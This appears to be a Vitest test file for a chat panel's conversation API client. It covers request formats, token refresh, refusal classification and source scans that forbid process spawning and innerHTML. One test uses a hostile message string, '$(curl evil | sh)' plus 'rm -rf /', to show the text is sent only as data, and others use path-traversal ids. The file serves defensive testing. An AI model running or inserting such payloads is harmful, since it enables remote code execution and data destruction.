/**
 * The chat panel's client of the hosted conversation contract (#1571): the
 * requests it sends, how it classifies refusals, and what it never does.
 */

import { readdirSync, readFileSync } from "node:fs";
import { join, resolve } from "node:path";
import { describe, expect, it, vi } from "vitest";
import { ConversationClient, refusal } from "../../../src/services/conversation/ConversationClient";

const BASE = "https://api.example.test";

function jsonResponse(status: number, body: unknown): Response {
  return new Response(body === undefined ? null : JSON.stringify(body), {
    status,
    headers: { "content-type": "application/json" },
  });
}

function client(
  responses: Response[],
  opts: { token?: string | null; refreshed?: string | null } = {}
) {
  const calls: { url: string; init: RequestInit }[] = [];
  const fetchImpl = vi.fn(async (url: string | URL | Request, init?: RequestInit) => {
    calls.push({ url: String(url), init: init ?? {} });
    const next = responses.shift();
    if (!next) throw new Error("no response queued");
    return next;
  }) as unknown as typeof fetch;
  const refresher = { forceRefresh: vi.fn(async () => opts.refreshed ?? null) };
  const c = new ConversationClient(
    () => BASE,
    { retrieve: async () => (opts.token === undefined ? "tok-1" : opts.token) },
    refresher,
    fetchImpl
  );
  return { c, calls, refresher };
}

const MESSAGE = {
  id: "m1",
  conversation_id: "c1",
  turn_id: "t1",
  position: 1,
  role: "user",
  content: "hi",
  redacted: false,
  actor_account_id: "a1",
  client_message_id: "k1",
  target_workspace_id: "w1",
  retention_class: "durable",
  created_at: "2026-10-17T00:00:00Z",
};
const TURN = {
  id: "t1",
  conversation_id: "c1",
  poster_account_id: "a1",
  target_workspace_id: "w1",
  host_agent_id: null,
  operator_account_id: null,
  state: "queued",
  failure_reason: null,
};

describe("ConversationClient requests", () => {
  it("posts message text only as the JSON content field, with no target unless one was picked", async () => {
    const { c, calls } = client([jsonResponse(201, { message: MESSAGE, turn: TURN })]);
    const text = '$(curl evil | sh) `whoami` "; rm -rf / #';
    const result = await c.postMessage("c1", { content: text, clientMessageId: "k1" });
    expect(result.ok).toBe(true);
    expect(calls[0]!.url).toBe(`${BASE}/v1/conversations/c1/messages`);
    expect(calls[0]!.init.method).toBe("POST");
    expect(JSON.parse(String(calls[0]!.init.body))).toEqual({
      content: text,
      client_message_id: "k1",
    });
    expect((calls[0]!.init.headers as Record<string, string>).Authorization).toBe("Bearer tok-1");
  });

  it("sends target_workspace_id when the user picked one", async () => {
    const { c, calls } = client([jsonResponse(201, { message: MESSAGE, turn: TURN })]);
    await c.postMessage("c1", { content: "x", clientMessageId: "k2", targetWorkspaceId: "w2" });
    expect(JSON.parse(String(calls[0]!.init.body)).target_workspace_id).toBe("w2");
  });

  it("creates a conversation with its visibility", async () => {
    const { c, calls } = client([
      jsonResponse(201, {
        id: "c9",
        team_id: "tm",
        created_by: "a1",
        title: null,
        visibility: "private",
        last_activity_at: "2026-10-17T00:00:00Z",
      }),
    ]);
    const result = await c.createConversation("w1", "private");
    expect(JSON.parse(String(calls[0]!.init.body))).toEqual({
      workspace_id: "w1",
      visibility: "private",
    });
    expect(result.ok && result.value.visibility).toBe("private");
  });

  it("reads the picker as the conversation's team workspace list", async () => {
    const { c, calls } = client([
      jsonResponse(200, {
        workspaces: [
          {
            id: "w1",
            slug: "platform",
            display_name: "Platform",
            conversation_target: {
              eligible: true,
              reason: null,
              host: { agent_id: "ag", operator_account_id: "op" },
              execution_profile: {
                adapter: "codex",
                adapter_display_name: "Codex",
                adapter_source: "config",
                performance_mode: "frontier",
                performance_mode_source: "file",
                effort: "high",
                effort_source: "default",
              },
              host_profile_state: "uniform",
            },
          },
        ],
        conversation_id: "c1",
        previous_target_workspace_id: null,
        resolved_target_workspace_id: "w1",
      }),
    ]);
    const result = await c.picker("c1");
    expect(calls[0]!.url).toBe(`${BASE}/v1/workspaces?conversation_id=c1`);
    expect(result.ok && result.value.workspaces[0]).toMatchObject({
      id: "w1",
      eligible: true,
      host_operator_account_id: "op",
      execution_profile: { adapter: "codex", performance_mode: "frontier", effort: "high" },
    });
  });

  it("refreshes an expired token once and retries", async () => {
    const { c, calls, refresher } = client(
      [
        jsonResponse(401, { code: "UNAUTHORIZED", message: "expired" }),
        jsonResponse(200, { teams: [] }),
      ],
      { refreshed: "tok-2" }
    );
    const result = await c.listTeams();
    expect(result.ok).toBe(true);
    expect(refresher.forceRefresh).toHaveBeenCalledTimes(1);
    expect((calls[1]!.init.headers as Record<string, string>).Authorization).toBe("Bearer tok-2");
  });

  it("does not refresh on a role refusal", async () => {
    const { c, refresher } = client([
      jsonResponse(403, { error: { code: "PERMISSION_DENIED", message: "viewer" } }),
    ]);
    const result = await c.postMessage("c1", { content: "x", clientMessageId: "k" });
    expect(refresher.forceRefresh).not.toHaveBeenCalled();
    expect(!result.ok && result.kind).toBe("not_permitted");
  });

  it("answers signed out with no token and never calls the service", async () => {
    const { c, calls } = client([], { token: null });
    const result = await c.listTeams();
    expect(!result.ok && result.kind).toBe("signed_out");
    expect(calls).toHaveLength(0);
  });

  it("answers a network failure as unreachable, never throwing", async () => {
    const fetchImpl = vi.fn(async () => {
      throw new TypeError("fetch failed");
    }) as unknown as typeof fetch;
    const c = new ConversationClient(
      () => BASE,
      { retrieve: async () => "t" },
      undefined,
      fetchImpl
    );
    const result = await c.listTeams();
    expect(!result.ok && result.kind).toBe("network");
  });

  it("puts only the service's own ids in a path", async () => {
    const { c, calls } = client([]);
    for (const result of [
      await c.getConversation("../teams"),
      await c.cancelTurn("c1", "t1/../../x"),
      await c.getAttentionCard("dr_1?x=1"),
    ]) {
      expect(!result.ok && result.kind).toBe("invalid");
    }
    expect(calls).toHaveLength(0);
  });

  it("acts on a card through the attention resolve route with the option chosen", async () => {
    const { c, calls } = client([jsonResponse(200, { id: "dr_1" })]);
    await c.resolveAttentionCard("dr_1", "approve");
    expect(calls[0]!.url).toBe(`${BASE}/v1/attention/dr_1/resolve`);
    expect(JSON.parse(String(calls[0]!.init.body))).toEqual({ option_id: "approve" });
  });
});

describe("refusal classification", () => {
  const cases: [number, string, string][] = [
    [409, "TARGET_OFFLINE", "offline"],
    [409, "TARGET_NO_HOST", "offline"],
    [409, "NO_ELIGIBLE_WORKSPACE", "offline"],
    [403, "LICENSE_TIER_EXCEEDED", "not_entitled"],
    [403, "PERMISSION_DENIED", "not_permitted"],
    [429, "TURN_ALLOWANCE_EXHAUSTED", "quota_exhausted"],
    [429, "HOST_CAP_REACHED", "quota_exhausted"],
    [429, "RATE_LIMITED", "rate_limited"],
    [503, "RATE_LIMITER_UNAVAILABLE", "rate_limited"],
    [409, "TARGET_AMBIGUOUS", "choose_target"],
    [409, "PREVIOUS_TARGET_UNAVAILABLE", "choose_target"],
    [409, "TRANSCRIPT_FULL", "transcript_full"],
    [409, "TURN_QUEUE_FULL", "queue_full"],
    [400, "MESSAGE_TOO_LONG", "invalid"],
    [404, "NOT_FOUND", "not_found"],
    [401, "UNAUTHORIZED", "signed_out"],
  ];
  it.each(cases)("HTTP %i %s is %s", (status, code, kind) => {
    expect(refusal(status, { error: { code, message: "m" } }).kind).toBe(kind);
  });

  it("carries the candidates of an ambiguous post", () => {
    const failure = refusal(409, {
      error: {
        code: "TARGET_AMBIGUOUS",
        message: "pick one",
        details: { candidates: [{ workspace_id: "w1", display_name: "Platform" }, { bad: 1 }] },
      },
    });
    expect(failure.candidates).toEqual([{ workspace_id: "w1", display_name: "Platform" }]);
  });
});

describe("the chat panel's transport", () => {
  const SRC = resolve(__dirname, "../../../src");
  const files = [
    ...readdirSync(join(SRC, "services/conversation")).map((f) =>
      join(SRC, "services/conversation", f)
    ),
    ...readdirSync(join(SRC, "views/conversation")).map((f) => join(SRC, "views/conversation", f)),
    join(SRC, "commands/openConversation.ts"),
  ];

  /** A file's code, without its comments, which may name what it does not do. */
  const code = (file: string): string =>
    readFileSync(file, "utf8")
      .replace(/\/\*[\s\S]*?\*\//g, "")
      .replace(/^\s*\/\/.*$/gm, "");

  it("never spawns a process, so message text can never reach a command line", () => {
    for (const file of files) {
      const text = code(file);
      expect(text, file).not.toMatch(
        /child_process|\bspawn\(|\bexec\(|execFile|runInteractiveStage|skillRunner/
      );
    }
  });

  it("never reads this machine's own adapter or mode resolvers for the profile it shows", () => {
    for (const file of files) {
      const text = code(file);
      expect(text, file).not.toMatch(
        /resolvers\/|resolveExecutionProfile|agentExecutionProfile|getCoreSettings/
      );
    }
  });

  it("renders untrusted text with text nodes only", () => {
    const html = code(join(SRC, "views/conversation/ConversationHtml.ts"));
    expect(html).not.toMatch(
      /innerHTML|outerHTML|insertAdjacentHTML|document\.write|eval\(|new Function/
    );
  });
});
